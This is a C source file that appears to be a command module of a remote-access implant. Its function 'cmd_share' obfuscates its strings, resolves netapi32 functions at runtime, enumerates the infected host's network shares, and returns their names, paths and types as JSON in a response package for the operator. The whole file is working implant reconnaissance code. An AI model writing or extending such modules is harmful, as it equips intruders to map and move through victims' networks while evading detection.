#include "config.h"
#ifdef INCLUDE_CMD_SHARE

#include "commands.h"
#include "json_out.h"

typedef DWORD (WINAPI *fn_NetShareEnum_t)(LPCWSTR, DWORD, void**, DWORD, DWORD*, DWORD*, DWORD*);
typedef DWORD (WINAPI *fn_NetApiBufferFree_t)(void*);

VOID cmd_share(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    xstr(_net, "netapi32.dll");
    HMODULE h_net = inst->Win32.LoadLibraryA(_net);
    fn_NetShareEnum_t pEnum = h_net ?
        (fn_NetShareEnum_t)(void*)inst->Win32.GetProcAddress(h_net, "NetShareEnum") : NULL;
    fn_NetApiBufferFree_t pFree = h_net ?
        (fn_NetApiBufferFree_t)(void*)inst->Win32.GetProcAddress(h_net, "NetApiBufferFree") : NULL;
    if (!pEnum || !pFree) {
        package_add_string(inst, response, XSTR("netapi32 resolve failed"));
        response->is_error = TRUE;
        return;
    }

    // wide->narrow via kernel32 (WideCharToMultiByte is a FUNCTION, not a DLL)
    xstr(_k32s, "kernel32.dll");
    HMODULE h_k32s = inst->Win32.LoadLibraryA(_k32s);
    typedef int (WINAPI *fn_wc_t)(UINT, DWORD, LPCWSTR, int, LPSTR, int, LPCSTR, LPBOOL);
    fn_wc_t wc = h_k32s ? (fn_wc_t)(void*)inst->Win32.GetProcAddress(h_k32s, "WideCharToMultiByte") : NULL;

    BYTE* buf = NULL;
    DWORD entries = 0, total = 0, resume = 0;
    DWORD status = pEnum(NULL, 2, (void**)&buf, 0xFFFFFFFF, &entries, &total, &resume);
    if (status != 0 || !buf) {
        package_add_string(inst, response, XSTR("NetShareEnum failed"));
        response->is_error = TRUE;
        return;
    }

    JSON_BUF jb;
    j_init(&jb);
    j_append_raw(&jb, "{\"shares\":[");
    // SHARE_INFO_2 (x64 natural alignment): LPWSTR netname(0), DWORD type(8,pad 12),
    // LPWSTR remark(16), DWORD permissions(24,pad 28), DWORD max_uses(32),
    // DWORD current_uses(36,pad 40), LPWSTR path(40), LPWSTR passwd(48) = 56 bytes.
    // (48-byte stride read path out of the max/current_uses dwords - garbage pointer.)
    BYTE* p = buf;
    for (DWORD i = 0; i < entries; i++) {
        wchar_t* name = *(wchar_t**)(p + 0);
        DWORD type = *(DWORD*)(p + 8);
        wchar_t* remark = *(wchar_t**)(p + 16);
        wchar_t* path = *(wchar_t**)(p + 40);
        p += 56;
        if (i) j_append_raw(&jb, ",");
        j_append_raw(&jb, "{\"name\":");
        if (name) {
            char nb[128] = {0};
            if (wc) wc(0, 0, name, -1, nb, 128, NULL, NULL);
            j_append_str(&jb, nb);
        } else j_append_str(&jb, "-");
        j_append_raw(&jb, ",\"path\":");
        if (path) {
            char pb[256] = {0};
            if (wc) wc(0, 0, path, -1, pb, 256, NULL, NULL);
            j_append_str(&jb, pb);
        } else j_append_str(&jb, "-");
        j_append_raw(&jb, ",\"type\":");
        j_append_uint(&jb, type);
        j_append_raw(&jb, "}");
    }
    j_append_raw(&jb, "],\"count\":");
    j_append_uint(&jb, entries);
    j_append_raw(&jb, "}");
    package_add_bytes(inst, response, (BYTE*)jb.buf, jb.len);
    pFree(buf);
}

#endif
